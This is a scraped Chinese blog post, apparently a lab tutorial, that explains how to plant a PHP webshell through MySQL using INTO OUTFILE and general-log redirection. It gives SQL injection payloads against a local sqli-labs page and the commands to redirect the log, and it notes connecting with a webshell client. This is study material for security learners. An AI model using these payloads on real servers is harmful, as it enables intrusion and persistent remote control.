{"blogid": "124867330", "writerAge": "码龄3年", "writerBlogNum": "10", "writerCollect": "1", "writerComment": "3", "writerFan": "0", "writerGrade": "2级", "writerIntegral": "116", "writerName": "猫不理#", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_124867330.jpg", "writerRankTotal": "127129", "writerRankWeekly": "631202", "writerThumb": "4", "writerVisitNum": "12463", "blog_read_count": "966", "blog_time": "已于 2022-05-19 17:20:10 修改", "blog_title": "Mysql写入webshell两种方法总结-- into outfile,导入日志", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"htmledit_views\" id=\"content_views\">\n<p></p>\n<h1>1  成功向mysql写入webshell条件（至少）</h1>\n<pre><code>数据库的当前用户为ROOT或拥有FILE权限；（FILE权限指的是对服务器主机上文件的访问） \n知道网站目录的绝对路径； \nPHP的GPC参数为off状态； \nMySQL中的secure_file_priv参数不能为NULL状态。</code></pre>\n<h1></h1>\n<h1>2 secure_file_priv</h1>\n<p>secure_file_priv是用来限制load dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限。如下关于secure_file_priv的配置介绍</p>\n<ul><li>secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出，意味着通过outfile方法写入WebShell是无法成功的，但是通过导出日志的方法是可以的。</li><li>当secure_file_priv的值为/tmp/（具体文件路径） ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下</li><li>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</li></ul>\n<p></p>\n<h1>3 写入方法</h1>\n<h2>3.1使用outfile方法</h2>\n<p>Outfile方法其实是Mysql提供的一个用来写入文件的函数，当我们可以控制写入的文件内容以及文件的保存路径时，我们就可以达到传入WebShell的目的。当我们可以使用union查询时，我们构造一个如下语句，就可以达到效果：</p>\n<pre><code>Union select “这里是WebShell” into outfile “Web目录”；</code></pre>\n<p>当我们无法使用union时，还有一些其他方法也可以实现（利用分隔符写入）：</p>\n<pre><code>?id=1 INTO OUTFILE '物理路径' lines terminatedby （这里是WebShell）#\n?id=1 INTO OUTFILE '物理路径' fields terminatedby （这里是WebShell）# \n?id=1 INTO OUTFILE'物理路径'columns terminatedby （这里是WebShell）# \n?id=1 INTO OUTFILE '物理路径' lines startingby （这里是WebShell）#</code></pre>\n<h3>步骤</h3>\n<p>1） 检查secure_file_priv是否开启：show variables like '%secure%';确认其不为NULL，有值或为空都可以。（若是为NULL，则需要到my.ini文件中手动修改）</p>\n<p>show variables主要是用来查看系统变量的值</p>\n<p><a href=\"https://blog.csdn.net/qq_45730325/article/details/124847135?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22124847135%22%2C%22source%22%3A%22qq_45730325%22%7D&amp;ctrtid=mX2uh\" title=\"(38条消息) 解决phpstudy的mysql secure_file_priv 为null_猫不理#的博客-CSDN博客\">(38条消息) 解决phpstudy的mysql secure_file_priv 为null_猫不理#的博客-CSDN博客</a></p>\n<p> <img alt=\"\" height=\"246\" src=\"..\\..\\static\\image\\387eca949522449a83e2437f686c8e3e.png\" width=\"669\"/></p>\n<p> 2）查看是否具备写权限，select user,file_priv from mysql.user;</p>\n<p><img alt=\"\" height=\"360\" src=\"..\\..\\static\\image\\780491d89a9c4bd4a3749c017e4f81bc.png\" width=\"651\"/></p>\n<p> 查看当前用户可以用select uesr()</p>\n<p><img alt=\"\" height=\"709\" src=\"..\\..\\static\\image\\4bbf7de880a3494ca9b1e4c91c4d7266.png\" width=\"1092\"/></p>\n<p> 3)先判断闭合，再确认注入点</p>\n<p>4）利用outfile写入shell文件</p>\n<p>因为我们secure_file_priv为空，则可以向任意目录写入文件，但因为还需要工具进行连接，所以最好放在网站的根目录下。</p>\n<p>payload(unio):<a href=\"http://127.0.0.1/sqli/Less-7?id=1\" title=\"http://127.0.0.1/sqli/Less-7?id=1\">http://127.0.0.1/sqli/Less-7?id=1</a>')) union select 1,2,'' into outfile \"D:\\php\\phpstudy_pro\\WWW\\tt.php\" --+</p>\n<p><strong>错误点：1</strong> 插入的php语句记得是''，\"\"会插入不了；<strong>2</strong> 闭合条件是'))，不然也不行；<strong>3 </strong>储存的文件路径tt.php也要本身没有这个文件才可以；（要是出错了可以先去sql命令行先执行单句查询语句）</p>\n<p>payload(不用unio):<a href=\"http://127.0.0.1/sqli/Less-7?id=1\" title=\"http://127.0.0.1/sqli/Less-7?id=1\">http://127.0.0.1/sqli/Less-7?id=1</a>')) into outfile \"D:\\php\\phpstudy_pro\\WWW\\tqqqqqt.php\" fields terminated by '' --+</p>\n<p></p>\n<h2>3.2 导入日志写入webshell</h2>\n<p>1)检查当前mysql下log日志是否开启，以及log的默认地址在哪里</p>\n<p>show variables like '%general%';</p>\n<p><img alt=\"\" height=\"211\" src=\"..\\..\\static\\image\\e0095fc239a1450cb53f4f4184ccd36c.png\" width=\"1157\"/></p>\n<p>将日志开启，Set global general_log = on;</p>\n<p>修改日志写入位置：Set global general_log_file = 'D:\\php\\phpstudy_pro\\WWW\\sqli\\Less-7\\a.log';</p>\n<p>（这里我只能改路径，不然菜刀连不上，因为我不知道菜刀怎么连mysql的位置）</p>\n<p><img alt=\"\" height=\"205\" src=\"..\\..\\static\\image\\7bb27c727cdb4208b35d32f2494c3789.png\" width=\"854\"/></p>\n<p>写入日志：')) union select '' --+</p>\n<p>成功看到日志里面有木马</p>\n<p><img alt=\"\" height=\"62\" src=\"..\\..\\static\\image\\de8fedf9cbce4feca564ef8d526349bf.png\" width=\"1200\"/></p>\n<p></p>\n</div>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 0, "javascript": 0, "java": 0, "sql": 1, "php": 1, "time": "2022-05-19 17:20:10", "summary": "成功向写入条件至少数据库的当前用户为或拥有权限；权限指的是对服务器主机上文件的访问知道网站目录的绝对路径；的参数为状态；中的参数不能为状态。是用来限制、、函数在哪个目录下拥有上传和读取文件的权限。如下"}